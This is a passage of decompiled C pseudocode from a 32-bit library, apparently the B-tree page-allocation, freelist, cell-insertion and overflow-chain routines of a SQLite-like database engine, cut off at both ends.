    *(_DWORD *)(a1 + 80) = 0;
    if ( v4 )
    {
      *a2 = 0;
      return 0;
    }
    v5 = *(__int16 *)(a1 + 84);
    v6 = *(_DWORD *)(a1 + 4 * v5 + 88);
    if ( *(_BYTE *)(v6 + 3) )
    {
      if ( !*(_WORD *)(a1 + 2 * v5 + 168) )
      {
        while ( *(_WORD *)(a1 + 84) )
        {
          sub_1006385B(a1);
          if ( *(_WORD *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168) )
            goto LABEL_16;
        }
        *(_BYTE *)(a1 + 67) = 0;
        goto LABEL_6;
      }
LABEL_16:
      v11 = (_WORD *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168);
      *(_WORD *)(a1 + 62) = 0;
      *(_BYTE *)(a1 + 66) = 0;
      --*v11;
      v12 = *(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88);
      if ( !*(_BYTE *)(v12 + 2) || *(_BYTE *)(v12 + 3) )
        result = 0;
      else
        result = sub_10063E4D(a1, a2);
    }
    else
    {
      v7 = *(_DWORD *)(v6 + 64);
      v8 = (_BYTE *)(v7 + *(unsigned __int16 *)(v6 + 12) + 2 * *(unsigned __int16 *)(a1 + 2 * v5 + 168));
      LOBYTE(v9) = v8[1];
      HIBYTE(v9) = *v8;
      v10 = sub_10059C56((_BYTE *)(v7 + (unsigned __int16)(*(_WORD *)(v6 + 18) & v9)));
      result = sub_100637FB(a1, v10);
      if ( result )
        return result;
      result = sub_100639B3(a1);
    }
    *a2 = 0;
  }
  return result;
}

//----- (10063F4D) --------------------------------------------------------
int __cdecl sub_10063F4D(int a1, int *a2, int *a3, unsigned int a4, char a5)
{
  int *v5; // esi
  int v6; // edi
  int v7; // ebx
  void *v8; // eax
  int result; // eax
  _BYTE *v10; // eax
  unsigned int v11; // eax
  _BYTE *v12; // edi
  unsigned int v13; // esi
  void *v14; // eax
  int v15; // edi
  int v16; // ecx
  _BYTE *v17; // eax
  int v18; // eax
  signed int v19; // esi
  int v20; // eax
  unsigned int v21; // eax
  unsigned int v22; // eax
  int v23; // ecx
  unsigned int *v25; // ecx
  unsigned int v26; // esi
  BOOL v27; // eax
  int v28; // eax
  int v29; // ecx
  int v30; // eax
  unsigned int *v31; // esi
  unsigned int v32; // eax
  unsigned int v33; // ecx
  int v34; // edi
  void *v35; // esi
  _BYTE *v36; // eax
  const void *v37; // [esp-8h] [ebp-44h]
  int v38; // [esp-4h] [ebp-40h]
  int v39; // [esp+10h] [ebp-2Ch] BYREF
  void *v40; // [esp+14h] [ebp-28h] BYREF
  int v41; // [esp+18h] [ebp-24h]
  unsigned int v42; // [esp+1Ch] [ebp-20h]
  unsigned int v43; // [esp+20h] [ebp-1Ch]
  int v44; // [esp+24h] [ebp-18h] BYREF
  unsigned int v45; // [esp+28h] [ebp-14h]
  unsigned int v46; // [esp+2Ch] [ebp-10h]
  int v47; // [esp+30h] [ebp-Ch]
  int v48; // [esp+34h] [ebp-8h]
  char v49; // [esp+3Ah] [ebp-2h] BYREF
  char v50; // [esp+3Bh] [ebp-1h]

  v5 = (int *)a1;
  v6 = *(_DWORD *)(a1 + 12);
  v7 = 0;
  v44 = 0;
  v47 = 0;
  v41 = v6;
  v46 = sub_100620A9((int *)a1);
  v8 = (void *)sub_10059C56((_BYTE *)(*(_DWORD *)(v6 + 64) + 36));
  v40 = v8;
  if ( (unsigned int)v8 >= v46 )
    return 11;
  if ( v8 )
  {
    v50 = 0;
    if ( a5 && a4 <= v46 )
    {
      result = sub_1006175A(a4, (int *)a1, &v49, 0);
      if ( result )
        return result;
      if ( v49 == 2 )
        v50 = 1;
      *a3 = a4;
    }
    result = sub_1006EFC8(*(_DWORD *)(v6 + 68));
    if ( !result )
    {
      sub_10059C70((_BYTE *)(*(_DWORD *)(v6 + 64) + 36), (int)v40 - 1);
      while ( 1 )
      {
        v47 = v7;
        if ( v7 )
          v10 = *(_BYTE **)(v7 + 64);
        else
          v10 = (_BYTE *)(*(_DWORD *)(v6 + 64) + 32);
        v11 = sub_10059C56(v10);
        v45 = v11;
        if ( v11 > v46 )
        {
          v48 = 11;
LABEL_67:
          v7 = 0;
          goto LABEL_85;
        }
        v48 = sub_10062069(v5, v11, &v44, 0);
        if ( v48 )
          goto LABEL_67;
        v7 = v44;
        v12 = *(_BYTE **)(v44 + 64);
        v13 = sub_10059C56(v12 + 4);
        v43 = v13;
        if ( !v13 && !v50 )
          break;
        if ( v13 > (*(unsigned __int16 *)(a1 + 22) >> 2) - 2 )
          goto LABEL_68;
        if ( v50 && a4 == v45 )
        {
          v38 = *(_DWORD *)(v7 + 68);
          *a2 = v7;
          v50 = 0;
          v48 = sub_1006EFC8(v38);
          if ( v48 )
            goto LABEL_85;
          if ( v13 )
          {
            v14 = (void *)sub_10059C56((_BYTE *)(*(_DWORD *)(v7 + 64) + 8));
            v40 = v14;
            if ( (unsigned int)v14 > v46 )
              goto LABEL_68;
            v48 = sub_10062069((int *)a1, (unsigned int)v14, &v39, 0);
            if ( v48 )
              goto LABEL_85;
            v15 = v39;
            v48 = sub_1006EFC8(*(_DWORD *)(v39 + 68));
            if ( v48 )
            {
              v28 = v15;
              goto LABEL_84;
            }
            memcpy(*(void **)(v15 + 64), *(const void **)(v7 + 64), 4u);
            sub_10059C70((_BYTE *)(*(_DWORD *)(v15 + 64) + 4), v43 - 1);
            memcpy((void *)(*(_DWORD *)(v15 + 64) + 8), (const void *)(*(_DWORD *)(v7 + 64) + 12), 4 * v16);
            sub_100620FB(v15);
            if ( v47 )
            {
              v48 = sub_1006EFC8(*(_DWORD *)(v47 + 68));
              if ( v48 )
                goto LABEL_85;
              v17 = *(_BYTE **)(v47 + 64);
            }
            else
            {
              v17 = (_BYTE *)(*(_DWORD *)(v41 + 64) + 32);
            }
            sub_10059C70(v17, (int)v40);
          }
          else
          {
            v37 = *(const void **)(v7 + 64);
            if ( v47 )
              memcpy(*(void **)(v47 + 64), v37, 4u);
            else
              memcpy((void *)(*(_DWORD *)(v41 + 64) + 32), v37, 4u);
          }
          goto LABEL_37;
        }
        if ( v13 )
        {
          v48 = sub_1006EFC8(*(_DWORD *)(v7 + 68));
          if ( v48 )
            goto LABEL_85;
          v42 = 0;
          if ( a4 )
          {
            v18 = sub_10059C56(v12 + 8);
            v19 = v18 - a4;
            if ( (int)(v18 - a4) < 0 )
              v19 = a4 - v18;
            v45 = 1;
            if ( v43 > 1 )
            {
              v40 = v12 + 12;
              do
              {
                v20 = sub_10059C56(v40) - a4;
                if ( v20 < 0 )
                  v20 = -v20;
                if ( v20 < v19 )
                {
                  v42 = v45;
                  v19 = v20;
                }
                ++v45;
                v40 = (char *)v40 + 4;
              }
              while ( v45 < v43 );
            }
          }
          v40 = &v12[4 * v42 + 8];
          v21 = sub_10059C56(v40);
          if ( v21 > v46 )
          {
LABEL_68:
            v48 = 11;
            goto LABEL_85;
          }
          if ( !v50 || v21 == a4 )
          {
            *a3 = v21;
            v22 = v43;
            v23 = v43 - 1;
            if ( v42 < --v43 )
            {
              memcpy(v40, &v12[4 * v22 + 4], 4u);
              v23 = v43;
            }
            sub_10059C70(v12 + 4, v23);
            v25 = *(unsigned int **)(a1 + 52);
            v26 = *a3;
            v27 = v25 && (v26 > *v25 || sub_10070BFA(v26, v25));
            v48 = sub_10062069((int *)a1, v26, a2, !v27);
            if ( !v48 )
            {
              v48 = sub_1006EFC8(*(_DWORD *)(*a2 + 68));
              if ( v48 )
                sub_100620FB(*a2);
            }
            v50 = 0;
          }
        }
LABEL_64:
        sub_100620FB(v47);
        v47 = 0;
        if ( !v50 )
          goto LABEL_85;
        v6 = v41;
        v5 = (int *)a1;
      }
      v48 = sub_1006EFC8(*(_DWORD *)(v7 + 68));
      if ( v48 )
        goto LABEL_85;
      *a3 = v45;
      memcpy((void *)(*(_DWORD *)(v41 + 64) + 32), *(const void **)(v7 + 64), 4u);
      *a2 = v7;
LABEL_37:
      v7 = 0;
      v44 = 0;
      goto LABEL_64;
    }
  }
  else
  {
    v29 = sub_100620A9((int *)a1) + 1;
    v30 = 0x40000000 / *(unsigned __int16 *)(a1 + 20);
    v31 = (unsigned int *)a3;
    *a3 = v29;
    if ( v29 == v30 + 1 )
      *a3 = v29 + 1;
    if ( *(_BYTE *)(a1 + 18) )
    {
      v32 = sub_1006166F(a1, *a3);
      v33 = *a3;
      if ( v32 == *a3 )
      {
        v40 = 0;
        v34 = sub_10062069((int *)a1, v33, (int *)&v40, 0);
        if ( v34 )
          return v34;
        v35 = v40;
        v34 = sub_1006EFC8(*((_DWORD *)v40 + 17));
        sub_100620FB((int)v35);
        if ( v34 )
          return v34;
        if ( ++*a3 == 0x40000000 / *(unsigned __int16 *)(a1 + 20) + 1 )
          ++*a3;
        v31 = (unsigned int *)a3;
      }
    }
    result = sub_10062069((int *)a1, *v31, a2, 0);
    if ( !result )
    {
      v48 = sub_1006EFC8(*(_DWORD *)(*a2 + 68));
      if ( v48 )
      {
        v28 = *a2;
LABEL_84:
        sub_100620FB(v28);
      }
LABEL_85:
      sub_100620FB(v7);
      sub_100620FB(v47);
      if ( v48 )
      {
        *a2 = 0;
      }
      else
      {
        v36 = (_BYTE *)*a2;
        if ( *(__int16 *)(*(_DWORD *)(*a2 + 68) + 22) > 1 )
        {
          sub_100620FB((int)v36);
          return 11;
        }
        *v36 = 0;
      }
      return v48;
    }
  }
  return result;
}
// 10064165: variable 'v16' is possibly undefined

//----- (10064437) --------------------------------------------------------
int __usercall sub_10064437@<eax>(int *a1@<eax>, int *a2@<edi>, unsigned int a3)
{
  int v3; // ebx
  int v4; // esi
  int *v5; // eax
  _BYTE *v6; // esi
  unsigned int v7; // esi
  int v8; // eax
  int v9; // ebx
  int v10; // ecx
  __int16 v11; // ax
  int *v12; // esi
  int *v13; // eax
  int v15; // [esp+8h] [ebp-14h]
  int v16; // [esp+Ch] [ebp-10h]
  int v17; // [esp+10h] [ebp-Ch] BYREF
  int *v18; // [esp+14h] [ebp-8h] BYREF
  int v19; // [esp+18h] [ebp-4h] BYREF

  v3 = a2[3];
  v17 = 0;
  v16 = 0;
  if ( a1 )
  {
    v18 = a1;
    ++*(_WORD *)(a1[17] + 22);
  }
  else
  {
    v4 = *(_DWORD *)(*a2 + 168);
    v18 = 0;
    sub_100691BB(v4, a3, 0, &v18);
    if ( v18 )
      v5 = (int *)sub_10062040(a3, v18, (int)a2);
    else
      v5 = 0;
    v18 = v5;
  }
  v19 = sub_1006EFC8(*(_DWORD *)(v3 + 68));
  if ( !v19 )
  {
    v6 = (_BYTE *)(*(_DWORD *)(v3 + 64) + 36);
    v15 = sub_10059C56(v6);
    sub_10059C70(v6, v15 + 1);
    if ( !*((_BYTE *)a2 + 18) || (sub_100616A8(a3, a2, 2, 0, &v19), !v19) )
    {
      if ( !v15 )
        goto LABEL_21;
      v16 = sub_10059C56((_BYTE *)(*(_DWORD *)(v3 + 64) + 32));
      v19 = sub_10062069(a2, v16, &v17, 0);
      if ( v19 )
        goto LABEL_26;
      v7 = sub_10059C56((_BYTE *)(*(_DWORD *)(v17 + 64) + 4));
      v8 = *((unsigned __int16 *)a2 + 11) >> 2;
      if ( v7 > v8 - 2 )
      {
        v19 = 11;
        goto LABEL_26;
      }
      if ( v7 < v8 - 8 )
      {
        v19 = sub_1006EFC8(*(_DWORD *)(v17 + 68));
        if ( !v19 )
        {
          v9 = v17;
          sub_10059C70((_BYTE *)(*(_DWORD *)(v17 + 64) + 4), v7 + 1);
          sub_10059C70((_BYTE *)(*(_DWORD *)(v9 + 64) + 4 * v7 + 8), a3);
          if ( v18 )
          {
            v10 = v18[17];
            v11 = *(_WORD *)(v10 + 20);
            if ( (v11 & 2) != 0 && !*(_DWORD *)(*(_DWORD *)(v10 + 16) + 92) )
              *(_WORD *)(v10 + 20) = v11 | 0x20;
          }
          v19 = sub_1006149E(a2, a3);
        }
      }
      else
      {
LABEL_21:
        v12 = v18;
        if ( !v18 )
        {
          v19 = sub_10062069(a2, a3, (int *)&v18, 0);
          if ( v19 )
            goto LABEL_26;
          v12 = v18;
        }
        v19 = sub_1006EFC8(v12[17]);
        if ( !v19 )
        {
          sub_10059C70((_BYTE *)v12[16], v16);
          sub_10059C70((_BYTE *)(v12[16] + 4), 0);
          sub_10059C70((_BYTE *)(*(_DWORD *)(v3 + 64) + 32), a3);
        }
      }
    }
  }
LABEL_26:
  v13 = v18;
  if ( v18 )
    *(_BYTE *)v18 = 0;
  sub_100620FB((int)v13);
  sub_100620FB(v17);
  return v19;
}

//----- (10064625) --------------------------------------------------------
int __usercall sub_10064625@<eax>(int result@<eax>, int *a2@<esi>)
{
  if ( !*a2 )
  {
    result = sub_10064437((int *)result, *(int **)(result + 60), *(_DWORD *)(result + 72));
    *a2 = result;
  }
  return result;
}

//----- (1006463B) --------------------------------------------------------
int __usercall sub_1006463B@<eax>(int a1@<eax>, int a2)
{
  int v2; // edi
  unsigned int v3; // esi
  unsigned int v4; // ebx
  int result; // eax
  int *v6; // esi
  unsigned int v7; // [esp-4h] [ebp-40h]
  char v8[20]; // [esp+10h] [ebp-2Ch] BYREF
  int v9; // [esp+24h] [ebp-18h]
  unsigned __int16 v10; // [esp+2Ah] [ebp-12h]
  unsigned __int16 v11; // [esp+2Ch] [ebp-10h]
  unsigned int v12; // [esp+30h] [ebp-Ch] BYREF
  int *v13; // [esp+34h] [ebp-8h] BYREF

  v2 = *(_DWORD *)(a1 + 60);
  sub_100617C9((int)v8, (_BYTE *)a1, a2);
  if ( v11 )
  {
    v3 = sub_10059C56((_BYTE *)(a2 + v11));
    v4 = ((unsigned __int16)(*(_WORD *)(v2 + 22) - 4) - (unsigned int)v10 + v9 - 1)
       / (unsigned __int16)(*(_WORD *)(v2 + 22) - 4);
    while ( v4 )
    {
      v12 = 0;
      v13 = 0;
      --v4;
      if ( v3 < 2 || v3 > sub_100620A9((int *)v2) )
        return 11;
      if ( v4 )
      {
        result = sub_10063527(v2, v3, &v13, &v12);
        if ( result )
          return result;
      }
      v7 = v3;
      v6 = v13;
      v13 = (int *)sub_10064437(v13, (int *)v2, v7);
      if ( v6 )
        sub_1006EC75(v6[17]);
      result = (int)v13;
      if ( v13 )
        return result;
      v3 = v12;
    }
  }
  return 0;
}
// 1006463B: using guessed type char var_2C[20];

//----- (100646FC) --------------------------------------------------------
int __usercall sub_100646FC@<eax>(
        int a1@<eax>,
        int Size,
        void *a3,
        signed __int64 a4,
        void *a5,
        int a6,
        int a7,
        _DWORD *a8)
{
  int v9; // ecx
  int v10; // esi
  bool v11; // zf
  int v12; // ebx
  int v13; // esi
  int v14; // eax
  int v15; // edi
  char *v16; // ebx
  _BYTE *v17; // esi
  int v18; // edi
  unsigned int v19; // ebx
  int v20; // eax
  int v21; // ebx
  char v23[26]; // [esp+10h] [ebp-40h] BYREF
  unsigned __int16 v24; // [esp+2Ah] [ebp-26h]
  unsigned __int16 v25; // [esp+2Ch] [ebp-24h]
  unsigned __int16 v26; // [esp+2Eh] [ebp-22h]
  int v27; // [esp+34h] [ebp-1Ch]
  int v28; // [esp+38h] [ebp-18h]
  int v29; // [esp+3Ch] [ebp-14h] BYREF
  int v30; // [esp+40h] [ebp-10h]
  void *Src; // [esp+44h] [ebp-Ch]
  int v32; // [esp+48h] [ebp-8h] BYREF
  int v33; // [esp+4Ch] [ebp-4h]

  v9 = *(_DWORD *)(a1 + 60);
  v10 = 0;
  v11 = *(_BYTE *)(a1 + 3) == 0;
  v29 = 0;
  v30 = 0;
  v27 = v9;
  v32 = 0;
  if ( v11 )
    v10 = 4;
  v12 = Size;
  if ( *(_BYTE *)(a1 + 4) )
  {
    v10 += sub_10059996((_BYTE *)(v10 + Size), a7 + a6);
  }
  else
  {
    a7 = 0;
    a6 = 0;
  }
  v13 = sub_10059996((_BYTE *)(v10 + v12), a4) + v10;
  sub_100617C9((int)v23, (_BYTE *)a1, v12);
  v14 = a6;
  v11 = *(_BYTE *)(a1 + 2) == 0;
  a7 += a6;
  if ( !v11 )
  {
    a6 = 0;
    Src = a5;
    v33 = v14;
LABEL_11:
    v15 = v24;
    *a8 = v26;
    v16 = (char *)(v13 + Size);
    v17 = (_BYTE *)(Size + v25);
    while ( 1 )
    {
      if ( a7 <= 0 )
      {
        sub_100620FB(v30);
        return 0;
      }
      if ( !v15 )
        break;
LABEL_23:
      Size = a7;
      if ( a7 > v15 )
        Size = v15;
      if ( v33 <= 0 )
      {
        memset(v16, 0, Size);
      }
      else
      {
        if ( Size > v33 )
          Size = v33;
        memcpy(v16, Src, Size);
      }
      v33 -= Size;
      a7 -= Size;
      Src = (char *)Src + Size;
      v16 += Size;
      v15 -= Size;
      if ( !v33 )
      {
        v33 = a6;
        Src = a5;
      }
    }
    v18 = v27;
    v11 = *(_BYTE *)(v27 + 18) == 0;
    v19 = v32;
    v28 = v32;
    if ( !v11 )
    {
      do
      {
        do
          ++v19;
        while ( sub_1006166F(v18, v19) == v19 );
      }
      while ( v19 == 0x40000000 / *(unsigned __int16 *)(v18 + 20) + 1 );
      v32 = v19;
    }
    v20 = sub_10063F4D(v18, &v29, &v32, v19, 0);
    v21 = v29;
    v11 = *(_BYTE *)(v18 + 18) == 0;
    Size = v20;
    if ( !v11 )
    {
      if ( v20 )
        goto LABEL_34;
      sub_100616A8(v32, (int *)v18, (v28 != 0) + 3, v28, &Size);
      if ( !Size )
      {
LABEL_22:
        sub_10059C70(v17, v32);
        sub_100620FB(v30);
        v17 = *(_BYTE **)(v21 + 64);
        v30 = v21;
        sub_10059C70(v17, 0);
        v16 = (char *)(*(_DWORD *)(v21 + 64) + 4);
        v15 = *(unsigned __int16 *)(v18 + 22) - 4;
        goto LABEL_23;
      }
      sub_100620FB(v21);
    }
    if ( Size )
    {
LABEL_34:
      sub_100620FB(v30);
      return Size;
    }
    goto LABEL_22;
  }
  if ( a4 <= 0x7FFFFFFF && a3 )
  {
    a7 += a4;
    Src = a3;
    v33 = a4;
    goto LABEL_11;
  }
  return 11;
}
// 100646FC: using guessed type char var_40[26];

//----- (1006491B) --------------------------------------------------------
char __usercall sub_1006491B@<al>(int a1@<esi>, int a2, int a3, int *a4)
{
  int v4; // eax
  int v5; // eax
  _BYTE *v6; // ebx
  _BYTE *v7; // edi
  int v8; // ecx
  int v9; // ecx

  LOBYTE(v4) = (_BYTE)a4;
  if ( !*a4 )
  {
    v5 = *(_DWORD *)(a1 + 64);
    v6 = (_BYTE *)(v5 + *(unsigned __int8 *)(a1 + 5));
    v7 = (_BYTE *)(v5 + *(unsigned __int16 *)(a1 + 12) + 2 * a2);
    HIWORD(v8) = 0;
    BYTE1(v8) = *v7;
    BYTE1(v5) = v6[5];
    LOBYTE(v8) = v7[1];
    LOBYTE(v5) = v6[6];
    if ( (unsigned __int16)v8 < (int)(unsigned __int16)v5 || v8 + a3 > *(unsigned __int16 *)(*(_DWORD *)(a1 + 60) + 22) )
    {
      LOBYTE(v4) = (_BYTE)a4;
      *a4 = 11;
    }
    else
    {
      v4 = sub_10061C73(a1, v8, a3);
      if ( v4 )
      {
        *a4 = v4;
      }
      else
      {
        v9 = a2;
        while ( ++v9 < *(unsigned __int16 *)(a1 + 16) )
        {
          *v7 = v7[2];
          v7[1] = v7[3];
          v7 += 2;
        }
        v6[3] = --*(_WORD *)(a1 + 16) >> 8;
        LOBYTE(v4) = *(_BYTE *)(a1 + 16);
        v6[4] = v4;
        *(_WORD *)(a1 + 14) += 2;
      }
    }
  }
  return v4;
}

//----- (100649BE) --------------------------------------------------------
void __usercall sub_100649BE(_BYTE *a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6, int *a7)
{
  int v8; // edi
  int v10; // eax
  int v11; // eax
  int v12; // ebx
  _BYTE *v13; // eax
  bool v14; // zf
  char v15; // ch
  _BYTE *v16; // eax
  _BYTE *v17; // eax
  unsigned __int8 v18; // cl
  int v19; // [esp+Ch] [ebp-10h]
  int v20; // [esp+10h] [ebp-Ch]
  _BYTE *v21; // [esp+14h] [ebp-8h]
  int v22; // [esp+18h] [ebp-4h] BYREF
  unsigned int v23; // [esp+30h] [ebp+14h]

  v8 = a6 != 0 ? 4 : 0;
  if ( *(_BYTE *)(a2 + 1) || a5 + 2 > *(unsigned __int16 *)(a2 + 14) )
  {
    if ( a1 )
    {
      memcpy(&a1[v8], (const void *)(v8 + a4), a5 - v8);
      v17 = a1;
    }
    else
    {
      v17 = (_BYTE *)a4;
    }
    if ( a6 )
      v17 = sub_10059C70(v17, a6);
    v18 = *(_BYTE *)(a2 + 1);
    *(_BYTE *)(a2 + 1) = v18 + 1;
    *(_DWORD *)(a2 + 8 * v18 + 20) = v17;
    *(_WORD *)(a2 + 8 * v18 + 24) = a3;
  }
  else
  {
    v10 = sub_1006EFC8(*(_DWORD *)(a2 + 68));
    if ( v10
      || (v11 = *(unsigned __int16 *)(a2 + 12),
          v12 = *(_DWORD *)(a2 + 64),
          v20 = v11 + 2 * *(unsigned __int16 *)(a2 + 16),
          v19 = v11 + 2 * a3,
          (v10 = sub_10061B37(a2, a5, &v22)) != 0) )
    {
      *a7 = v10;
    }
    else
    {
      ++*(_WORD *)(a2 + 16);
      *(_WORD *)(a2 + 14) += -2 - a5;
      v21 = (_BYTE *)(v12 + v22);
      memcpy((void *)(v8 + v12 + v22), (const void *)(v8 + a4), a5 - v8);
      if ( a6 )
        sub_10059C70(v21, a6);
      v13 = (_BYTE *)(v20 + v12);
      if ( v20 > v19 )
      {
        v23 = ((unsigned int)(v20 - v19 - 1) >> 1) + 1;
        do
        {
          v14 = v23-- == 1;
          *v13 = *(v13 - 2);
          v13[1] = *(v13 - 1);
          v13 -= 2;
        }
        while ( !v14 );
      }
      v15 = BYTE1(v22);
      v16 = (_BYTE *)(v19 + v12);
      v16[1] = v22;
      *v16 = v15;
      *(_BYTE *)(*(unsigned __int8 *)(a2 + 5) + v12 + 3) = *(_BYTE *)(a2 + 17);
      *(_BYTE *)(*(unsigned __int8 *)(a2 + 5) + v12 + 4) = *(_BYTE *)(a2 + 16);
      if ( *(_BYTE *)(*(_DWORD *)(a2 + 60) + 18) )
        sub_100619BB(a7, a2, a4);
    }
  }
}

//----- (10064B22) --------------------------------------------------------
int __usercall sub_10064B22@<eax>(int a1@<esi>, int a2, int a3, int a4)
{
  int v4; // ecx
  int v5; // ebx
  int result; // eax
  int v7; // edi
  int v8; // edx
  _BYTE *v9; // edx
  _BYTE *v10; // edi
  __int16 v11; // [esp+8h] [ebp-14h]
  int v12; // [esp+Ch] [ebp-10h]
  _BYTE *v13; // [esp+14h] [ebp-8h]
  int v14; // [esp+18h] [ebp-4h]

  v4 = *(_DWORD *)(a1 + 64);
  v12 = *(unsigned __int8 *)(a1 + 5);
  v5 = *(unsigned __int16 *)(*(_DWORD *)(a1 + 60) + 22);
  result = a2;
  v7 = a2 - 1;
  v14 = v4;
  v11 = *(_WORD *)(*(_DWORD *)(a1 + 60) + 22);
  v8 = v4 + *(unsigned __int16 *)(a1 + 12) + 2 * a2;
  if ( a2 - 1 >= 0 )
  {
    while ( 1 )
    {
      v5 -= *(unsigned __int16 *)(a4 + 2 * v7);
      v9 = (_BYTE *)(v8 - 2);
      *v9 = BYTE1(v5);
      v9[1] = v5;
      v13 = v9;
      memcpy((void *)(v5 + v4), *(const void **)(a3 + 4 * v7), *(unsigned __int16 *)(a4 + 2 * v7));
      v4 = v14;
      if ( --v7 < 0 )
        break;
      v8 = (int)v13;
    }
    result = a2;
  }
  v10 = (_BYTE *)(v12 + v4);
  v10[3] = BYTE1(result);
  v10[5] = BYTE1(v5);
  v10[6] = v5;
  v10[4] = result;
  *(_WORD *)(a1 + 14) += v5 - 2 * result - v11;
  *(_WORD *)(a1 + 16) = result;
  return result;
}

//----- (10064BC8) --------------------------------------------------------
int __usercall sub_10064BC8@<eax>(int a1@<ebx>, int a2, int a3)
{
  int v3; // edi
  unsigned __int16 v5; // ax
  int v6; // esi
  int v7; // esi
  int v8; // edi
  int v9; // eax
  __int16 v10; // cx
  char *v11; // eax
  char *v12; // edi
  char v13; // cl
  char *v14; // edi
  char v15; // cl
  char *v16; // edx
  char *v17; // edx
  int v18; // [esp+8h] [ebp-18h] BYREF
  char *v19; // [esp+Ch] [ebp-14h]
  int v20; // [esp+10h] [ebp-10h] BYREF
  int v21; // [esp+14h] [ebp-Ch] BYREF
  int v22; // [esp+18h] [ebp-8h] BYREF
  int v23; // [esp+1Ch] [ebp-4h] BYREF

  v3 = *(_DWORD *)(a1 + 60);
  if ( !*(_WORD *)(a1 + 16) )
    return 11;
  v23 = sub_10063F4D(v3, &v22, &v18, 0, 0);
  if ( !v23 )
  {
    v19 = (char *)(a3 + 4);
    v20 = *(_DWORD *)(a1 + 20);
    v5 = sub_1006190B(a1, v20);
    v6 = v22;
    v21 = v5;
    sub_10061FAA(v22, 13);
    sub_10064B22(v6, 1, (int)&v20, (int)&v21);
    v7 = a2;
    if ( *(_BYTE *)(v3 + 18) )
    {
      sub_100616A8(v18, (int *)v3, 5, *(_DWORD *)(a2 + 72), &v23);
      if ( (unsigned __int16)v21 > *(_WORD *)(v22 + 10) )
      {
        sub_100619BB(&v23, v22, v20);
        v7 = a2;
      }
    }
    v8 = *(_DWORD *)(a1 + 64);
    v9 = v8 + *(unsigned __int16 *)(a1 + 12) + 2 * *(unsigned __int16 *)(a1 + 16);
    HIBYTE(v10) = *(_BYTE *)(v9 - 2);
    LOBYTE(v10) = *(_BYTE *)(v9 - 1);
    v11 = (char *)(v8 + (unsigned __int16)(*(_WORD *)(a1 + 18) & v10));
    v12 = v11 + 9;
    do
      v13 = *v11++ & 0x80;
    while ( v13 && v11 < v12 );
    v14 = v11 + 9;
    do
    {
      v15 = *v11;
      v16 = v19;
      *v19 = *v11;
      v17 = v16 + 1;
      ++v11;
      v19 = v17;
    }
    while ( (v15 & 0x80) != 0 && v11 < v14 );
    if ( !v23 )
      sub_100649BE(0, v7, *(unsigned __int16 *)(v7 + 16), a3, (int)&v17[-a3], *(_DWORD *)(a1 + 72), &v23);
    sub_10059C70((_BYTE *)(*(unsigned __int8 *)(v7 + 5) + *(_DWORD *)(v7 + 64) + 8), v18);
    sub_100620FB(v22);
  }
  return v23;
}

//----- (10064D0D) --------------------------------------------------------
int __usercall sub_10064D0D@<eax>(int a1@<eax>, int a2, int *a3)
{
  int result; // eax
  int v5; // eax
  _BYTE *v6; // ebx
  unsigned __int16 v7; // dx
  int v8; // esi
  int v9; // [esp+Ch] [ebp-Ch]
  int v10; // [esp+10h] [ebp-8h]

  result = (int)a3;
  if ( !*a3 )
  {
    v5 = *(_DWORD *)(a1 + 64);
    v10 = *(_DWORD *)(a2 + 64);
    v6 = (_BYTE *)(v5 + *(unsigned __int8 *)(a1 + 5));
    HIBYTE(v7) = v6[5];
    v9 = *(_DWORD *)(a1 + 60);
    v8 = *(_DWORD *)(a2 + 72) != 1 ? 0 : 100;
    LOBYTE(v7) = v6[6];
    memcpy((void *)(v10 + v7), (const void *)(v7 + v5), *(unsigned __int16 *)(v9 + 22) - v7);
    memcpy((void *)(v10 + v8), v6, *(unsigned __int16 *)(a1 + 12) + 2 * *(unsigned __int16 *)(a1 + 16));
    *(_BYTE *)a2 = 0;
    result = sub_10061E53(a2);
    if ( !result )
    {
      result = v9;
      if ( !*(_BYTE *)(v9 + 18) )
        return result;
      result = sub_10062B85(a2);
    }
    *a3 = result;
  }
  return result;
}

//----- (10064DB0) --------------------------------------------------------
int __usercall sub_10064DB0@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  int v4; // esi
  int *v6; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // edi
  int v11; // eax
  int v12; // ecx
  _BYTE *v13; // eax
  __int16 v14; // dx
  int *v15; // ebx
  int v16; // eax
  _BYTE *v17; // ebx
  int v18; // ecx
  _BYTE *v19; // eax
  __int16 v20; // dx
  _BYTE *v21; // ebx
  unsigned __int16 v22; // ax
  int v23; // ecx
  int v24; // eax
  unsigned int v25; // ebx
  int v26; // eax
  int v27; // edi
  int v28; // ebx
  int *v29; // edi
  int *v30; // ecx
  int v31; // edi
  int v32; // eax
  int v33; // edi
  int v34; // eax
  int v35; // edx
  int v36; // ecx
  int v37; // ecx
  _BYTE *v38; // eax
  __int16 v39; // dx
  int v40; // eax
  __int16 v41; // ax
  int v42; // edx
  bool v43; // cc
  unsigned __int16 v44; // ax
  unsigned __int16 *v45; // edi
  int *v46; // edx
  int v47; // ecx
  void **v48; // eax
  __int16 v49; // cx
  int v50; // eax
  int v51; // ecx
  int v52; // ebx
  int v53; // edx
  void *v54; // ebx
  int v55; // ebx
  int v56; // edi
  char *v57; // edx
  int v58; // eax
  int v59; // ecx
  int *v60; // ecx
  int v61; // eax
  int v62; // edi
  int *v63; // eax
  int v64; // ecx
  int v65; // eax
  bool v66; // zf
  int v67; // eax
  int *v68; // eax
  int *v69; // ecx
  int v70; // edx
  int *v71; // eax
  int *v72; // ebx
  int v73; // ecx
  int v74; // edi
  int v75; // ebx
  int v76; // esi
  int v77; // ebx
  unsigned __int16 v78; // cx
  int v79; // ebx
  int v80; // edi
  int v81; // ecx
  int v82; // edi
  int v83; // ebx
  int v84; // esi
  BOOL v85; // eax
  BOOL v86; // ecx
  unsigned __int8 v87; // al
  int v88; // eax
  int i; // esi
  int v90; // eax
  int v91; // eax
  int j; // esi
  int k; // esi
  const void *v94; // [esp-8h] [ebp-D4h]
  const void *v95; // [esp-8h] [ebp-D4h]
  int v96; // [esp-8h] [ebp-D4h]
  int v97; // [esp-8h] [ebp-D4h]
  int v98; // [esp-4h] [ebp-D0h]
  char v99[8]; // [esp+10h] [ebp-BCh] BYREF
  unsigned __int64 v100; // [esp+18h] [ebp-B4h]
  char v101[24]; // [esp+2Ch] [ebp-A0h] BYREF
